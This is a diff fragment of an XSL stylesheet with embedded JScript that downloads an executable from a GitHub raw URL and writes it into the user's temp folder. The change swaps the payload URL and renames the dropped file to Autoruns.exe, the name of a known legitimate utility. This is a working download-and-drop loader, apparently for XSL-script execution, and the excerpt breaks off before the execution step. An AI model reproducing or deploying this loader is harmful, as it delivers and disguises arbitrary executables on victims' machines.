@@ -3,13 +3,13 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-var Source = "https://raw.githubusercontent.com/tconqueror/bla/master/test.exe";
+var Source = "https://github.com/tconqueror/bla/raw/master/Autoruns.exe";
 var Object = new ActiveXObject('MSXML2.XMLHTTP');
 Object.Open('GET', Source, false);
 Object.Send();
 var r = new ActiveXObject('WScript.Shell');
 var appdata = r.ExpandEnvironmentStrings("%temp%");
-Target = appdata + "\\hello.exe"
+Target = appdata + "\\Autoruns.exe"
 var Stream = new ActiveXObject('ADODB.Stream');
 Stream.Open();
 Stream.Type = 1; 
